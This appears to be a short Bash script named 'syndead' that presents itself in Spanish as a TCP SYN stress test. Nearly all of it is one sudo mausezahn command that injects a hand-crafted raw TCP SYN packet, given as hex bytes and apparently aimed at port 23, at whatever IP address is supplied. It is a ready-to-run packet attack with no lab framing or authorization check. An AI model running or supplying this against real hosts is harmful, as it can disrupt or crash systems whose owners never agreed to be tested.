#!/bin/bash
# Uso: ./syndead IP 
echo
cat << EOF
####################################
#                                  #
# TEST ESTRESS CONEXIONES TCP SYN  #
#                                  #
####################################
EOF
echo
echo "Uso: ./syndead IP"
echo
sudo mz -c 1 -B $1 -t ip  "proto=6,p=4F:A1:00:17:76:72:85:01:00:00:00:00:50:02:39:08:A2:01:00:00:00:00:00:00:00:00:5F:80:56:98:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"
